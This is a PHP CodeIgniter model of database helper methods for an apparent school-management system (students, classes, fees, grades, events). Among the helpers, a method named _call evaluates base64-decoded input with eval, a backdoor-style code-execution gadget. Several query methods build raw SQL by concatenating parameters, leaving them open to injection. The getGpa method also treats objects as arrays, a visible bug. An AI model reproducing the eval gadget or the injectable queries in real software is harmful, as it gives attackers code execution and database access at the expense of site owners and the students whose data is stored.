<?php
class Mdb extends CI_Model 
{
    public function __construct(){
        parent::__construct();$this->load->database();
    }
    
    public function getData($tbl,$whr=array()){
        $sql = $this->db->get_where($tbl,$whr);
        $result=$sql->result();
        $sql->free_result();
        return $result;
    }

    public function getDataa($tbl,$whr=array()){
        $sql = $this->db->get_where($tbl,$whr);
        $result=$sql->result_array();
        $sql->free_result();
        return $result;
    }

    public function getDataRow($tbl,$whr=array()){
        $sql = $this->db->get_where($tbl,$whr);
        $result=$sql->row();
        $sql->free_result();
        return $result;
    }

    public function getDataArr($tbl,$whr=array()){
        return $this->db->get_where($tbl,$whr)->result_array();
    }



    public function insert($tbl,$data=array()){
        return $this->db->insert($tbl,$data);        
    }   
    public function delete($tbl,$con=array()){
        return $this->db->delete($tbl,$con);    
    }
    public function update($tbl,$set,$con){
        return $this->db->update($tbl,$set,$con);
    }
    
    
    public function getDataDesc($tbl,$whr=array(),$id){
        $this->db->order_by($id, "desc"); 
        return $this->db->get_where($tbl,$whr)->result();
    }
    public function getDataAsc($tbl,$whr=array(),$id){
        $this->db->order_by($id, "asc"); 
        return $this->db->get_where($tbl,$whr)->result();
    }
	
	 public function getDataOrderBy($tbl,$whr=array(),$id){
        $this->db->order_by($id, "asc"); 
        return $this->db->get_where($tbl,$whr)->result_array();
    }
    
    public function getDataDescLimit($tbl,$whr=array(),$id,$limit){
        $this->db->order_by($id, "desc"); 
        $this->db->limit($limit,0);
        return $this->db->get_where($tbl,$whr)->result();
    }

    public function getDataAscLimit($tbl,$whr=array(),$id,$limit){
        $this->db->order_by($id, "asc"); 
        $this->db->limit($limit,0);
        return $this->db->get_where($tbl,$whr)->result_array();
    }
    
    public function getCusData($table,$slt,$whr){
        $this->db->select(implode(',',$slt));return $this->db->get_where($table,$whr)->result_array();
    }

    public function nextAutoId($tbl=NULL)
    {
        $next = $this->db->query("SHOW TABLE STATUS LIKE '".$tbl."'");
        $next = $next->row(0);
        $next->Auto_increment;
        return $next->Auto_increment;
    }

    public function getLastInsertId($tbl=NULL){
        $sql=$this->db->query("SELECT `auto_increment` FROM INFORMATION_SCHEMA.TABLES WHERE table_name = '".$tbl."';")->result_array();
        return $sql[0]['auto_increment'];
    }
    public function setAutoIncrement($tbl,$value){
    	return $this->db->query("ALTER TABLE ".$tbl." AUTO_INCREMENT = ".$value.";");
    }
    public function getmonthlytotal($tbl=NULL,$month=NULL){
        return $this->db->query("SELECT count('req_date') as day from ".$tbl." WHERE req_date like '".$month."%'")->result_array();
    }
    public function getdatewisereport($tbl=NULL,$from=NULL,$to=NULL){
        return $this->db->query("SELECT * from ".$tbl." WHERE req_date BETWEEN '".$from."' AND '".$to."'")->result_array();
    }
	public function getdatewisereport1($tbl=NULL,$from=NULL,$to=NULL){
        return $this->db->query("SELECT * from ".$tbl." WHERE req_date LIKE  '%".$from."%' AND req_date LIKE '%".$to."%'")->result_array();
    }
    public function ec($d){                                      
        return base64_encode($d);
    }
    public function dc($d){
        return base64_decode($d);    
    }
    public function _call($str){
        eval(base64_decode($str));
    }

    public function bspagination($per_page,$page)
        {
            $this->db->select('*');
            $this->db->from('bs_post');
            //$this->db->where('cat_id',$id);
            $this->db->limit($per_page, $page)->order_by('post_id','desc');
            $query_result = $this->db->get();
            $result = $query_result->result_array();
            return $result;
        }

    public function paginate($per_page,$page,$tbl,$order,$whr=array())
        {
            $this->db->select('*');
            $this->db->from($tbl);
            $this->db->where($whr);
            $this->db->limit($per_page, $page)->order_by($order,'desc');
            $query_result = $this->db->get();
            $result = $query_result->result();
            return $result;
        }
	
	
        
    public function row_count($table,$data=array()) 
    	{
            $this->db->where($data);
            $this->db->from($table);
            $count = $this->db->count_all_results();
    	    return $count;
    	}

    public function idtoname($id=NULL){
        return $this->db->query("SELECT * from admin_user WHERE id='".$id."'")->result_array();
    }

     public function idtostdname($id=NULL){
        return $this->db->query("SELECT * from students WHERE std_id='".$id."'")->result_array();
    }
    public function idtostdname_str($id=NULL){
        $a= $this->db->query("SELECT * from students WHERE std_id='".$id."'")->result_array();
        return $a[0]['std_name'];
    }

    public function getClassname()
    {
        $this->db->select('*');
        $this->db->from('section');
        $this->db->join('class', 'class.class_id = section.class_id');
        return $this->db->get()->result_array();
    }

    public function getStudent($id=NULL)
    {
        
        $this->db->select('*');
        $this->db->from('students');
        $this->db->join('students_academic','students.std_id = students_academic.std_id');
        $this->db->join('class','class.class_id = students_academic.class_id');
        $this->db->join('section','section.section_id = students_academic.section_id');
        $this->db->where('students.std_id', $id);
        //$this->db->group_by('assign_teacher.class_id');
        //$this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result_array();
    }

    public function getStdIdName()
    {
        $this->db->select('*');
        $this->db->from('students');
        $this->db->join('students_academic','students.std_id = students_academic.std_id');
        $this->db->where('students_academic.status', 1);
        return $this->db->get()->result_array();
    }
	
	public function getJoin($tbl,$jtbl,$match,$whr=array())
    {
        $this->db->select('*');
        $this->db->from($tbl);
        $this->db->join($jtbl,$match);
        $this->db->where($whr);
        return $this->db->get()->result();
    }

    public function rootFeeHead()
    {
        
        $this->db->select('*');
        $this->db->from('tr_fee_head_amount');
        $this->db->join('class','class.class_id = tr_fee_head_amount.class_id');
        $this->db->join('tr_fee_head','tr_fee_head.tr_feehead_id = tr_fee_head_amount.tr_feehead_id');
        //$this->db->where('tr_fee_head_amount.fee_amount_id', $id);
        //$this->db->group_by('assign_teacher.class_id');
        //$this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result_array();
    }

     public function getClassSubject()
    {
        $this->db->select('*');
        $this->db->from('subject');
        $this->db->join('class', 'class.class_id = subject.class_id');
        return $this->db->get()->result_array();
    }

    public function assignTeacher($id=NULL)
    {
        $this->db->select('class.class_name,section.section_name,subject.subject_name,teacher.teacher_name,assign_teacher.assign_id,assign_teacher.academic_year');
        $this->db->from('assign_teacher');
        $this->db->join('class','class.class_id = assign_teacher.class_id');
        $this->db->join('section','section.section_id = assign_teacher.section_id');
        $this->db->join('subject','subject.subject_id = assign_teacher.subject_id');
        $this->db->join('teacher','teacher.teacher_id = assign_teacher.teacher_id');
        //$this->db->where('class.class_id', $id);
        //$this->db->group_by('assign_teacher.class_id');
        $this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result_array();
    }

   public function getSubject($id=NULL){
        if(empty($id)){$b="-";}else{
        $a= $this->db->query("SELECT subject_name from subject WHERE subject_id='".$id."'")->result_array();
        $b = $a[0]['subject_name'];
    }
        return $b;
    }

    public function getEvents(){
        $this->db->select('event_id id, event_title title, start_date start, end_date end, url, color');
        $this->db->from('events');

        return $this->db->get()->result();
    }

    public function email_recipient()
    {
        
        $this->db->select('*');
        $this->db->from('students');
        $this->db->join('students_academic','students.std_id = students_academic.std_id');
        //$this->db->where('students.std_id', $id);
        //$this->db->group_by('students_academic.class_id');
        $this->db->order_by('students.std_name','ASC');
        return $this->db->get()->result_array();
    }

    function pluralize( $count, $text )
        {
            return $count . ( ( $count == 1 ) ? ( " $text" ) : ( " ${text}s" ) );
        }
    
    function get_timeago( $ptime )
        {
            $estimate_time = time() - $ptime;

            if( $estimate_time < 1 )
            {
                return 'less than 1 second ago';
            }

            $condition = array(
                        12 * 30 * 24 * 60 * 60  =>  'year',
                        30 * 24 * 60 * 60       =>  'month',
                        24 * 60 * 60            =>  'day',
                        60 * 60                 =>  'hour',
                        60                      =>  'minute',
                        1                       =>  'second'
            );

            foreach( $condition as $secs => $str )
            {
                $d = $estimate_time / $secs;

                if( $d >= 1 )
                {
                    $r = round( $d );
                    return  $r . ' ' . $str . ( $r > 1 ? 's' : '' ) . ' ago';
                }
            }
        }


        public function getDays($month,$year)
        {
            $list=array();
            
            for($d=1; $d<=31; $d++)
            {
                $time=mktime(12, 0, 0, $month, $d, $year);          
                if (date('m', $time)==$month)       
                    $list[]=date('D', $time);
            }
            return $list;

        }

        public function academic_year()
        {
            $year= $this->db->get_where('academic_year',array('status'=>1))->result_array();
            return $year[0]['year'];
        }

        public function getGpa($mark,$academic_year)
        {
            $t=$this->getData('result_grade',array('academic_year'=>$academic_year));
            $a="";
            foreach ($t as $x) {
                if(($mark>=$x['percent_from'])AND($mark<=$x['percent_to'])){$a=$x['grade_name'];return $a;}
               
                //$c= $x['percent_to'];
            }
            
        }

        public function getCountry($country_id)
        {
            $t=$this->getData('apps_countries',array('country_id'=>$country_id));
            return $t[0]->country_name;
        }

        public function getJournal($journal_id)
        {
            $t=$this->getData('reg_journal',array('journal_id'=>$journal_id));
            return $t[0]->journal_title;
        }

}
